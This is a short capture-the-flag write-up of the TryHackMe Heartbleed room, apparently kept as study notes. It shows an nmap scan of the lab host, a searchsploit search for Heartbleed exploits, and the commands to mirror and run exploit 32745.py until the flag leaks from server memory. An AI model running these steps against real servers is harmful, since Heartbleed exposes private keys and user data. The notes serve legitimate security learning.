# Heartbleed
Name: HeartBleed
Date: 23/07/2022
Difficulty:  
Description: SSL issues are still lurking in the wild. Can you exploit this web servers OpenSSL?
Better Description: 
Goals: OSCP HTB box research
Learnt: Heartbleed, using python2 makes me feel dirty

This is very simple room I used to further my research into the vulnerability for a HTB box.
I used the attackbox and scanned for nmap for just pure demonstrative purposes

```bash
root@ip-10-10-228-113:~# nmap -sC -sV -F 34.243.85.159

Starting Nmap 7.60 ( https://nmap.org ) at 2022-07-23 21:58 BST
Nmap scan report for ec2-34-243-85-159.eu-west-1.compute.amazonaws.com (34.243.85.159)
Host is up (0.0012s latency).
Not shown: 97 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:53:e3:d9:9d:44:04:a0:71:83:19:2b:ac:36:69:d5 (RSA)
|   256 b1:1b:9a:a6:35:55:79:a5:f6:93:55:51:c6:88:2c:67 (ECDSA)
|_  256 b9:d3:d1:f2:22:2c:07:bb:f3:a4:b4:44:ef:df:e0:87 (EdDSA)
111/tcp open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38271/tcp  status
|_  100024  1          52326/udp  status
443/tcp open  ssl/http nginx 1.15.7
|_http-server-header: nginx/1.15.7
|_http-title: What are you looking for?
| ssl-cert: Subject: commonName=localhost/organizationName=TryHackMe/stateOrProvinceName=London/countryName=UK
| Not valid before: 2019-02-16T10:41:14
|_Not valid after:  2020-02-16T10:41:14
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1

root@ip-10-10-228-113:~# searchsploit heartbleed
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds

----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosur | multiple/remote/32764.py
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (1)    | multiple/remote/32791.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Information Leak (2) (D | multiple/remote/32998.c
OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure       | multiple/remote/32745.py
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

root@ip-10-10-228-113:~# searchsploit -m multiple/remote/32745.py # to mirror the exploit

# Change the scrollback to unlimited as there is a lot of null data going to display and I ran the exploit multiple times.

python2 32745.py # till it heartbleeds the flag.
```




